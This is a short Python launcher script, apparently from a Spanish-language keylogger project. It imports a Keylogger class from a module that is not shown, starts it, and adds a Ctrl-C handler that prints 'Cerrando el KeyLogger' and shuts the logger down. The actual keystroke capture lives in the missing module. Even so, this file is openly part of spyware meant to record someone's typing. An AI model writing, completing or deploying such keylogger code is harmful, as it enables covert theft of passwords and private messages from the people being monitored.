#!/usr/bin/env python3

from Keylogger import Keylogger
from termcolor import colored
import signal
import sys

my_keylogger = None

def def_handler(sig, frame):
    print(colored("\n[!] Cerrando el KeyLogger", "red"))
    if my_keylogger:
        my_keylogger.shutdown()

    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':

    my_keylogger = Keylogger()
    my_keylogger.start()